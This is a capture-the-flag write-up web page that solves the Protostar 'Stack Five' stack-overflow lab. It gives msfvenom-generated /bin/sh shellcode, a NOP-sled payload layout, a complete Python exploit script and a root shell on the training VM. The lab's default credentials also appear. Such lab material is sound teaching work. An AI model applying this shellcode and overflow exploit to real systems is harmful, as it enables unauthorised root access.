<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>pwncone.io</title>
    <link rel="stylesheet" href="../../../../css/style.css">
  </head>

<body>

<section>

    <writeup>
        <h1><strong>#Protostar - Stack Five</strong></h1>
        <a href="https://exploit.education/protostar/stack-five/">https://exploit.education/protostar/stack-five/</a><br>
        <strong>NOTE</strong>: I'm exploiting stack5 on the protostar VM, not on my attacking system<br>
        <br>
        <img alt="images\3-1.png" src="images/3-1.png"><br>
        <br>
        This challenge is a classic stack overflow.<br>
        We overflow the buffer, write shellcode to the stack, and execute it.<br>
        The tricky part of this challenge is jumping to the shellcode you've dropped.<br>
        <br>
        For a classic stack overflow, you need:<br>
        • the offset to EIP<br>
        • the address of your shellcode<br>
        • shellcode<br>
        ◇ Refer here for pre-written shellcode - <a href="http://shell-storm.org/shellcode/">http://shell-storm.org/shellcode/</a><br>
        ◇ Or use <code>msfvenom</code> to generate your own<br>
        <br>
        First things first, find the offset to EIP to overflow the buffer.<br>
        <br>
        <a id="h2-1" name="h2-1"></a><strong></strong>
        <h2><strong>1) Find EIP offset</strong></h2><br>
        SSH into your protostar VM with the credentials <code>user / user</code> (or just access it locally), and open the stack5 binary in gdb.<br>
            <div class="codebox">
                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>exploit-education<span style="color:#ff9d00;font-weight:700">/</span>protostar]<br>
                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#ssh&nbsp;user@192.168.1.72</span><br>
                <br>
                <br>
                &nbsp;&nbsp;&nbsp;&nbsp;PPPP&nbsp;&nbsp;RRRR&nbsp;&nbsp;&nbsp;OOO&nbsp;&nbsp;TTTTT&nbsp;&nbsp;OOO&nbsp;&nbsp;&nbsp;SSSS&nbsp;TTTTT&nbsp;&nbsp;&nbsp;A&nbsp;&nbsp;&nbsp;RRRR&nbsp;&nbsp;<br>
                &nbsp;&nbsp;&nbsp;&nbsp;P&nbsp;&nbsp;&nbsp;P&nbsp;R&nbsp;&nbsp;&nbsp;R&nbsp;O&nbsp;&nbsp;&nbsp;O&nbsp;&nbsp;&nbsp;T&nbsp;&nbsp;&nbsp;O&nbsp;&nbsp;&nbsp;O&nbsp;S&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;T&nbsp;&nbsp;&nbsp;&nbsp;A&nbsp;A&nbsp;&nbsp;R&nbsp;&nbsp;&nbsp;R&nbsp;<br>
                &nbsp;&nbsp;&nbsp;&nbsp;PPPP&nbsp;&nbsp;RRRR&nbsp;&nbsp;O&nbsp;&nbsp;&nbsp;O&nbsp;&nbsp;&nbsp;T&nbsp;&nbsp;&nbsp;O&nbsp;&nbsp;&nbsp;O&nbsp;&nbsp;SSS&nbsp;&nbsp;&nbsp;&nbsp;T&nbsp;&nbsp;&nbsp;AAAAA&nbsp;RRRR&nbsp;&nbsp;<br>
                &nbsp;&nbsp;&nbsp;&nbsp;P&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;R&nbsp;&nbsp;R&nbsp;&nbsp;O&nbsp;&nbsp;&nbsp;O&nbsp;&nbsp;&nbsp;T&nbsp;&nbsp;&nbsp;O&nbsp;&nbsp;&nbsp;O&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;S&nbsp;&nbsp;&nbsp;T&nbsp;&nbsp;&nbsp;A&nbsp;&nbsp;&nbsp;A&nbsp;R&nbsp;&nbsp;R&nbsp;&nbsp;<br>
                &nbsp;&nbsp;&nbsp;&nbsp;P&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;R&nbsp;&nbsp;&nbsp;R&nbsp;&nbsp;OOO&nbsp;&nbsp;&nbsp;&nbsp;T&nbsp;&nbsp;&nbsp;&nbsp;OOO&nbsp;&nbsp;SSSS&nbsp;&nbsp;&nbsp;&nbsp;T&nbsp;&nbsp;&nbsp;A&nbsp;&nbsp;&nbsp;A&nbsp;R&nbsp;&nbsp;&nbsp;R&nbsp;<br>
                <br>
                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>exploit-exercises.com<span style="color:#ff9d00;font-weight:700">/</span>protostar&nbsp;&nbsp;&nbsp;&nbsp;<br>
                <br>
                Welcome&nbsp;to&nbsp;Protostar.&nbsp;To&nbsp;log&nbsp;in,&nbsp;you&nbsp;may&nbsp;use&nbsp;the&nbsp;user&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;user&nbsp;account.<br>
                When&nbsp;you&nbsp;need&nbsp;to&nbsp;use&nbsp;the&nbsp;root&nbsp;account,&nbsp;you&nbsp;can&nbsp;<span style="color:#ff9d00;font-weight:700">login</span>&nbsp;as&nbsp;root&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;godmode.<br>
                [...]<br>
                $&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>protostar<span style="color:#ff9d00;font-weight:700">/</span>bin<br>
                $&nbsp;gdb&nbsp;-q&nbsp;stack5<br>
                Reading&nbsp;symbols&nbsp;from&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>protostar<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>stack5...done.<br>
                <span style="color:#ff9d00;font-weight:700">(</span>gdb<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;
            </div>
        </div><br>
        <br>
        On your attacking machine, generate a cyclic pattern using <code>msf-pattern_create</code>.<br>
        On Kali this is located at <code>/usr/share/metasploit-framework/tools/pattern_create.rb</code><br>
            <div class="codebox">
                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>exploit-education<span style="color:#ff9d00;font-weight:700">/</span>protostar]<br>
                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#msf-pattern_create&nbsp;-l&nbsp;100</span><br>
                Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
            </div>
        </div><br>
        <br>
        Back in gdb, run the binary and submit the cyclic pattern.<br>
        The binary should crash.<br>
            <div class="codebox">
                <span style="color:#ff9d00;font-weight:700">(</span>gdb<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;run<br>
                Starting&nbsp;program<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>protostar<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>stack5&nbsp;<br>
                Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A<br>
                <br>
                Program&nbsp;received&nbsp;signal&nbsp;SIGSEGV,&nbsp;Segmentation&nbsp;fault.<br>
                0x63413563&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;??&nbsp;<span style="color:#ff9d00;font-weight:700">()</span>
            </div>
        </div><br>
        <br>
        The stack has been overflowed and EIP has been overwritten with <code>0x63413563</code>, which is part of our cyclic pattern.<br>
        <br>
        Submit the contents of EIP to <code>msf-pattern_offset</code>.<br>
        This will tell us the offset at which EIP gets overwritten.<br>
            <div class="codebox">
                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>exploit-education<span style="color:#ff9d00;font-weight:700">/</span>protostar]<br>
                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#msf-pattern_offset&nbsp;-q&nbsp;0x63413563&nbsp;</span><br>
                [*]&nbsp;Exact&nbsp;match&nbsp;at&nbsp;offset&nbsp;76
            </div>
        </div><br>
        <br>
        Great!<br>
        The offset to overwrite EIP is <code>76</code>,<br>
        which means that we need to write 76 bytes of junk to overflow the buffer.<br>
        <br>
        Don't close gdb!<br>
        <br>
        <a id="h2-2" name="h2-2"></a><strong></strong>
        <h2><strong>2) Find shellcode address</strong></h2><br>
        Next, we need to find the address of where our shellcode will be once it's written to the stack.<br>
        <br>
        Still in gdb, examine the registers at the time of the crash.<br>
            <div class="codebox">
                Program&nbsp;received&nbsp;signal&nbsp;SIGSEGV,&nbsp;Segmentation&nbsp;fault.<br>
                0x63413563&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;??&nbsp;<span style="color:#ff9d00;font-weight:700">()</span><br>
                <span style="color:#ff9d00;font-weight:700">(</span>gdb<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">info</span>&nbsp;registers<br>
                eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffc70 -1073742736<br>
                ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffc70 -1073742736<br>
                edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xb7fd9334 -1208118476<br>
                ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xb7fd7ff4 -1208123404<br>
                esp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbffffcc0 0xbffffcc0<br>
                ebp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x41346341 0x41346341<br>
                esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0 0<br>
                edi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0 0<br>
                eip&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x63413563 0x63413563<br>
                [...]
            </div>
        </div><br>
        <br>
        ESP stands for <em>Extended Stack Pointer</em>.<br>
        The ESP register points to the top of the stack.<br>
        At the time of the crash, ESP is pointing to <code>0xbffffcc0</code>, which is just after the end of the buffer we've overflown.<br>
        <br>
        <strong>Payload Structure v1</strong><br>
        If we overflow the buffer, overwrite EIP with <code>0xbffffcc0</code>, and <em>then</em> write our shellcode to the stack; we should get code execution.<br>
        <br>
        Our payload structure would look like this:<br>
        (pseudo code example, not actually usable)<br>
            <div class="codebox">
                payload&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>*76&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;overflow&nbsp;buffer</span><br>
                payload&nbsp;+=&nbsp;0xbffffcc0&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;overwrite&nbsp;EIP&nbsp;and&nbsp;jump&nbsp;to&nbsp;top&nbsp;of&nbsp;the&nbsp;stack</span><br>
                payload&nbsp;+=&nbsp;shellcode&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;write&nbsp;shellcode&nbsp;to&nbsp;stack</span>
            </div>
        </div><br>
        <br>
        <a id="h3-1" name="h3-1"></a><strong></strong>
        <h3><strong>NOP Sled</strong></h3><br>
        However, to give us some leniency in case our shellcode doesn't exactly start at address <code>0xbffffcc0</code> (which it definitely won't), we can build a NOP sled.<br>
        <br>
        NOP is an x86 assembly instruction - <code>\x90</code> - which stands for NO OPERATION.<br>
        NOP does nothing.<br>
        Before your shellcode, you write a large sequence of NOPs to the stack.<br>
        If you return to a sequence of NOPs, the CPU will do nothing, and ride the NOP sled all the way down to your shellcode.<br>
        <br>
        <strong>Payload Structure v2</strong><br>
        Now with the NOP sled in use, our payload structure will look like this<br>
        (again, this is pseudo code)<br>
            <div class="codebox">
                payload&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>*76&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;overflow&nbsp;buffer</span><br>
                payload&nbsp;+=&nbsp;0xbffffcc0&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;overwrite&nbsp;EIP&nbsp;and&nbsp;jump&nbsp;to&nbsp;top&nbsp;of&nbsp;the&nbsp;stack</span><br>
                payload&nbsp;+=&nbsp;NOP&nbsp;*&nbsp;100&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;write&nbsp;NOP&nbsp;sled&nbsp;to&nbsp;stack&nbsp;-&nbsp;100&nbsp;bytes&nbsp;long</span><br>
                payload&nbsp;+=&nbsp;shellcode&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;write&nbsp;shellcode&nbsp;to&nbsp;stack</span>
            </div>
        </div><br>
        <br>
        At this point, we have the offset to EIP and the memory address of our shellcode to jump to.<br>
        The last thing to do is generate some shellcode.<br>
        <br>
        <a id="h2-3" name="h2-3"></a><strong></strong>
        <h2><strong>3) Generate shellcode</strong></h2><br>
        You could use some pre-written shellcode from <a href="http://shell-storm.org/shellcode/">http://shell-storm.org/shellcode/</a> to spawn a shell (like this <a href="http://shell-storm.org/shellcode/files/shellcode-811.php">http://shell-storm.org/shellcode/files/shellcode-811.php</a>) , or you could generate your own using msfvenom.<br>
        <br>
        I used msfvenom.<br>
        <br>
            <div class="codebox">
                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>exploit-education<span style="color:#ff9d00;font-weight:700">/</span>protostar]<br>
                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#msfvenom&nbsp;-p&nbsp;linux/x86/exec&nbsp;CMD="/bin/sh"&nbsp;-f&nbsp;python&nbsp;-v&nbsp;shellcode</span><br>
                [-]&nbsp;No&nbsp;platform&nbsp;was&nbsp;selected,&nbsp;choosing&nbsp;Msf<span style="color:#ff9d00;font-weight:700">::</span>Module<span style="color:#ff9d00;font-weight:700">::</span>Platform<span style="color:#ff9d00;font-weight:700">::</span>Linux&nbsp;from&nbsp;the&nbsp;payload<br>
                [-]&nbsp;No&nbsp;arch&nbsp;selected,&nbsp;selecting&nbsp;arch<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;x86&nbsp;from&nbsp;the&nbsp;payload<br>
                No&nbsp;encoder&nbsp;or&nbsp;badchars&nbsp;specified,&nbsp;outputting&nbsp;raw&nbsp;payload<br>
                Payload&nbsp;size<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;43&nbsp;bytes<br>
                Final&nbsp;size&nbsp;of&nbsp;python&nbsp;<span style="color:#ff9d00;font-weight:700">file:</span>&nbsp;257&nbsp;bytes<br>
                shellcode&nbsp;=&nbsp;&nbsp;b<span style="color:#3ad900;font-weight:400">""</span><br>
                shellcode&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7"</span><br>
                shellcode&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89"</span><br>
                shellcode&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\xe3\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e"</span><br>
                shellcode&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x2f\x73\x68\x00\x57\x53\x89\xe1\xcd\x80"</span>
            </div>
        </div><br>
        <br>
        <a id="h2-4" name="h2-4"></a><strong></strong>
        <h2><strong>4) Write exploit</strong></h2><br>
        At this point, we have everything we need to write our exploit.<br>
        <br>
        <a id="h3-2" name="h3-2"></a><strong></strong>
        <h3><strong>Overview</strong></h3><br>
        • The offset to EIP is <code>76</code> bytes.<br>
        • Our shellcode address is <code>0xbffffcc0</code><br>
        <br>
        We use <code>struct.pack('&lt;I'</code>, to pack the memory addresses in 32-bit little endian format.<br>
        <br>
        <a id="h3-3" name="h3-3"></a><strong></strong>
        <h3><strong>Final Exploit Code</strong></h3><br>
        My final exploit code is here:<br>
            <div class="codebox">
                <span style="color:#0088ff;font-weight:400">#!/usr/bin/python</span><br>
                <span style="color:#0088ff;font-weight:400">#&nbsp;exploit.education&nbsp;-&nbsp;Stack&nbsp;Five</span><br>
                <br>
                import&nbsp;struct<br>
                <br>
                <span style="color:#0088ff;font-weight:400">#&nbsp;msfvenom&nbsp;-p&nbsp;linux/x86/exec&nbsp;CMD="/bin/sh"&nbsp;-f&nbsp;python&nbsp;-v&nbsp;shellcode</span><br>
                <span style="color:#0088ff;font-weight:400">#&nbsp;43&nbsp;bytes</span><br>
                shellcode&nbsp;=&nbsp;&nbsp;b<span style="color:#3ad900;font-weight:400">""</span><br>
                shellcode&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7"</span><br>
                shellcode&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89"</span><br>
                shellcode&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\xe3\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e"</span><br>
                shellcode&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x2f\x73\x68\x00\x57\x53\x89\xe1\xcd\x80"</span><br>
                <br>
                bufferSize&nbsp;=&nbsp;76<br>
                esp&nbsp;=&nbsp;struct.pack<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">'&lt;I'</span>,&nbsp;0xbffffcc0<span style="color:#ff9d00;font-weight:700">)</span><br>
                nops&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"\x90"</span><br>
                <br>
                payload&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>*bufferSize&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;overflow&nbsp;buffer</span><br>
                payload&nbsp;+=&nbsp;esp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;jump&nbsp;to&nbsp;top&nbsp;of&nbsp;stack</span><br>
                payload&nbsp;+=&nbsp;nops*100&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;nop&nbsp;sled</span><br>
                payload&nbsp;+=&nbsp;shellcode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;shellcode</span><br>
                <br>
                print&nbsp;payload
            </div>
        </div><br>
        <br>
        <a id="h2-5" name="h2-5"></a><strong></strong>
        <h2><strong>5) Win</strong></h2><br>
        Because we're spawning a shell, we need to halt the program with <code>cat</code> so that we can interact with the spawned shell.<br>
        Otherwise, the shell would spawn but the binary would quit immediately.<br>
        <br>
            <div class="codebox">
                $&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>python&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>stack5.py<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">cat)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;.<span style="color:#ff9d00;font-weight:700">/</span>stack5<br>
                <span style="color:#ff9d00;font-weight:700">id</span><br>
                <span style="color:#7f0044;font-weight:400">uid</span>=1001<span style="color:#ff9d00;font-weight:700">(</span>user<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;gid=1001<span style="color:#ff9d00;font-weight:700">(</span>user<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;euid=0<span style="color:#ff9d00;font-weight:700">(</span>root<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">groups</span>=0<span style="color:#ff9d00;font-weight:700">(</span>root<span style="color:#ff9d00;font-weight:700">)</span>,1001<span style="color:#ff9d00;font-weight:700">(</span>user<span style="color:#ff9d00;font-weight:700">)</span><br>
                <span style="color:#ff9d00;font-weight:700">whoami</span><br>
                root<br>
            </div>
        </div><br>
        <br>
        Success!<br>
        We've successfully written shellcode to the stack and executed it, and we're root :)
    </writeup>
</section>

</body>
</html>